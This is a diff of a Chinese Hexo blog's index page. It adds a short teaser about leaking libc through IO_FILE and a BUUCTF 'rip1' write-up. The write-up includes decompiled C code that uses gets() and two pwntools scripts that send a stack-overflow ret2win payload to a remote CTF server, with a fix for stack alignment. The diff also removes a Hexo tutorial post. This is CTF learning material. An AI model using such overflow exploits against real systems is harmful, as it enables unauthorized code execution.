@@ -204,7 +204,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -217,7 +217,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -249,6 +249,166 @@
       
 
       
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/8601552c/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ykx">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lsh">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/8601552c/" class="post-title-link" itemprop="url">IO_FILE泄露libc地址</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-02-01 14:34:17 / 修改时间：17:05:15" itemprop="dateCreated datePublished" datetime="2021-02-01T14:34:17+08:00">2021-02-01</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>这两天做了两道没有输出函数，需要靠stdout来泄露libc的题，记录一下这种利用方式。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/8601552c/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/757fcf82/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ykx">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lsh">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/757fcf82/" class="post-title-link" itemprop="url">BUUCTF pwn基础题</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-01-24 23:07:53" itemprop="dateCreated datePublished" datetime="2021-01-24T23:07:53+08:00">2021-01-24</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-02-01 17:03:57" itemprop="dateModified" datetime="2021-02-01T17:03:57+08:00">2021-02-01</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="rip1"><a href="#rip1" class="headerlink" title="rip1"></a>rip1</h1><p>题目就是一个简单的栈溢出。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+1h] [rbp-Fh]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets(&amp;s, argv);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同时也有后门函数。</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210124231022387.png" alt="image-20210124231022387"></p>
+<p>根据ida反编译的结果，payload应该是<code>&#39;a&#39;*23+p64(fun_addr)</code></p>
+<p>编写exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26615</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./pwn1&quot;)</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*(<span class="number">23</span>)+p64(<span class="number">0x401186</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>结果为：</p>
+<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210124231126641.png" alt="image-20210124231126641"></p>
+<p>其原因是栈没有对齐。具体参考<a target="_blank" rel="noopener" href="http://blog.eonew.cn/archives/958">http://blog.eonew.cn/archives/958</a></p>
+<p>最终解决exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26615</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./pwn1&quot;)</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*(<span class="number">23</span>)+p64(<span class="number">0x401186</span>+<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里地址加一是为了栈平衡，绕过了<code>push ebp</code>这条指令。这样rsp不会加1，还是对齐的。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
     
 
 
@@ -1096,7 +1256,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-01-27 23:31:21" itemprop="dateModified" datetime="2021-01-27T23:31:21+08:00">2021-01-27</time>
+        <time title="修改时间：2021-02-01 16:20:28" itemprop="dateModified" datetime="2021-02-01T16:20:28+08:00">2021-02-01</time>
       </span>
 
   
@@ -1668,84 +1828,11 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/posts/0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="ykx">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Lsh">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/posts/0/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2020-10-30 13:11:11" itemprop="dateCreated datePublished" datetime="2020-10-30T13:11:11+08:00">2020-10-30</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-12-23 18:14:18" itemprop="dateModified" datetime="2020-12-23T18:14:18+08:00">2020-12-23</time>
-      </span>
 
   
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><h2 id="1-新建文章"><a href="#1-新建文章" class="headerlink" title="1 新建文章"></a>1 新建文章</h2><p>以hello world为例，在hexo目录下命令行输入<code>hexo new &quot;hello_world&quot;</code>，然后会在source的_posts目录下生成一个hello_world.md文件,在该markdown文件中就可以编辑这篇文章的内容了。编辑完成后刷新博客，博客里便会出现这篇文章，同时hexo也会直接为这篇文章生成一个页面。</p>
-<h2 id="2-新建草稿"><a href="#2-新建草稿" class="headerlink" title="2 新建草稿"></a>2 新建草稿</h2><p>hexo默认配置是新建文章，所以如果需要新建一篇草稿，需要输入<code>hexo new draft &quot;文章名称&quot;</code>，然后再source的目录下会生成一个_drafts文件夹，里面会有所有新建的草稿，如果想要预览草稿，可以输入<code>hexo server --draft</code>命令来预览草稿文件</p>
-<p>当草稿完成以后，可以通过输入<code>hexo publish &quot;文章名称&quot;</code>来发布草稿，然后这篇草稿会从_drafts中被删除，出现在_posts目录下。</p>
-<h2 id="3-删除文章"><a href="#3-删除文章" class="headerlink" title="3 删除文章"></a>3 删除文章</h2><p>删除文章十分简单，只需要把_posts目录下需要删除的markdown删除，然后刷新博客之后这篇文章就不会出现在博客中了。</p>
-<p>当然还有更多的教程可以直接去<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/writing.html">官网</a>学习。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-
-  
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
 
 
 
